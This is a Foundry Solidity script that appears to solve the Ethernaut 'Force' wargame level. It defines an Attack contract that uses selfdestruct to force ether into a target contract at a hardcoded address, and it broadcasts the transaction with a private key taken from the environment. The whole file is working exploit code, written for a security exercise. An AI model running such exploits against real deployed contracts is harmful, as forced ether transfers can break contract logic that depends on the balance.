// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";

contract Attack {
    Force force;
    constructor(Force _force) {
        force = Force(_force);
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
}

contract ForceHack is Script {
    Force force = Force(payable(0xE49489e68EcEce4C5F4B0A84D039C9A79A7720D8));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // console.log("Balance before hack", address(force).balance);
        new Attack(force).attack();
        // console.log("Balance before hack", address(force).balance);

        vm.stopBroadcast();
    }
}

// forge script script/Force.s.sol -vv --tc ForceHack.sol
// forge script script/Force.s.sol -vv --broadcast
